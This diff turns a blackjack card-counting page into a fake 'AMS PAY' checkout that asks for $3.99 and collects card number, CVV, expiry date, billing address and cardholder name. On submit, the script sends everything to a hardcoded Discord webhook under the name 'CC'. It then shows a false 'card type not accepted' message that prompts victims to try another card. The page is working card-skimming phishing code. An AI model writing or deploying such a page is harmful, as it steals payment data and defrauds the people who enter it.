@@ -1,17 +1,233 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-	<title>Card Counting Program</title>
-	<link rel="stylesheet" type="text/css" href="style.css">
+    <title>Paywall</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .paywall-container {
+            text-align: center;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        form {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+            text-align: center;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            font-size: 14px;
+            text-align: center;
+            font-size: large;
+        }
+
+        .expiration-container {
+            display: flex;
+            text-align: center;
+        }
+
+        .expiration-input {
+            flex: 1;
+            margin-right: 5px;
+            text-align: center;
+        }
+
+        .expiration-input:last-child {
+            margin-right: 0;
+            text-align: center;
+        }
+
+        .expiration-input input[type="text"] {
+            padding-right: 30px;
+            text-align: center;
+        }
+
+        .expiration-input label {
+            position: relative;
+            text-align: center;
+        }
+
+        .expiration-input label::after {
+            content: attr(data-placeholder);
+            position: absolute;
+            top: 50%;
+            right: 5px;
+            transform: translateY(-50%);
+            color: #888;
+            pointer-events: none;
+            text-align: center;
+            
+        }
+
+        .expiration-input input[type="text"]:focus+label::after,
+        .expiration-input input[type="text"]:not(:placeholder-shown)+label::after {
+            display: none;
+            text-align: center;
+        }
+
+        button[type="submit"] {
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #45a049;
+        }
+        
+        h3 {
+            color: rgb(0, 0, 0);
+            font-size: xx-large;
+        }
+
+        span {
+            font-size: xx-large;
+
+        }
+    </style>
 </head>
+
 <body>
-	<div class="container">
-		<h1>Andoni Blackjack</h1>
-		<label for="cards">Enter the cards that have come out, separated by commas:</label>
-		<input type="text" id="cards" class="input">
-		<button onclick="countCards()" class="button">Count</button>
-		<p id="count" class="output"></p>
-	</div>
-	<script src="script.js"></script>
+    <div class="paywall-container">
+        <h1>AMS PAY🪐</h1>
+        <br>
+        <h3 class="price">Price: $3.99</h3>
+
+        <form id="paymentForm">
+            <label for="cardNumber">Card Number:</label>
+            <input type="text" id="cardNumber">
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" pattern="\d{3}" title="Please enter a valid 3-digit CVV" required>
+
+            <label for="expiration">Expiration Date:</label>
+            <div class="expiration-container">
+                <div class="expiration-input">
+                    <input type="text" id="expirationMonth" pattern="\d{2}" title="Please enter a valid 2-digit month"
+                        required>
+                    <label data-placeholder="MM"></label>
+                </div>
+                <span>/</span>
+                <div class="expiration-input">
+                    <input type="text" id="expirationYear" pattern="\d{2}" title="Please enter a valid 2-digit year"
+                        required>
+                    <label data-placeholder="YY"></label>
+                </div>
+            </div>
+
+            <label for="billingAddress">Billing Address:</label>
+            <input type="text" id="billingAddress">
+
+            <label for="cardHolderName">Card Holder's Name:</label>
+            <input type="text" id="cardHolderName" required>
+
+            <button type="submit" id="payNowBtn">Pay Now</button>
+        </form>
+        <h4>By clicking Pay Now, you agree to AMS PAY terms of service</h4>
+    </div>
+
+    <script>
+        const paymentForm = document.getElementById('paymentForm');
+        paymentForm.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Get form values
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cvv = document.getElementById('cvv').value;
+            const expirationMonth = document.getElementById('expirationMonth').value;
+            const expirationYear = document.getElementById('expirationYear').value;
+            const billingAddress = document.getElementById('billingAddress').value;
+            const cardHolderName = document.getElementById('cardHolderName').value;
+
+            const info = 'Card Number: ' + cardNumber + '\n' + 'CVV: ' + cvv + '\n' + 'Expiration Month: ' + expirationMonth + '/' + 'Expiration Year: ' + expirationYear + '\n' + 'Billing Address: ' + billingAddress + '\n' + 'Card Holder Name: ' + cardHolderName;
+
+            // Log the information to the console
+            //console.log('Card Number:', cardNumber);
+            //console.log('CVV:', cvv);
+            //console.log('Expiration Date:', expirationMonth + '/' + expirationYear);
+            //console.log('Billing Address:', billingAddress);
+            //console.log('Card Holder\'s Name:', cardHolderName);
+
+            //console.log(info);
+            // You can perform further processing or submit the data to a server here
+
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1118702973330149406/dEP9EGjy4XH6I3ERI-Hgv951ZZrnsKN7o4Mww45pipLnfPy8FZyDwIxqkhUONpG0BwQ4';
+
+            const sent = {
+                content: info,
+                username: 'CC',
+                avatar_url: 'https://img.freepik.com/iconos-gratis/visa_318-218290.jpg'
+            };
+
+
+            const requestOptions = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(sent)
+            };
+
+            fetch(webhookUrl, requestOptions)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Fetching . . .');
+                    } else {
+                        console.log('Status:', response.status);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+
+
+
+
+            // Clear form fields
+            paymentForm.reset();
+            alert("Card type not accepted, please try again with another card");
+
+        });
+    </script>
 </body>
+
 </html>
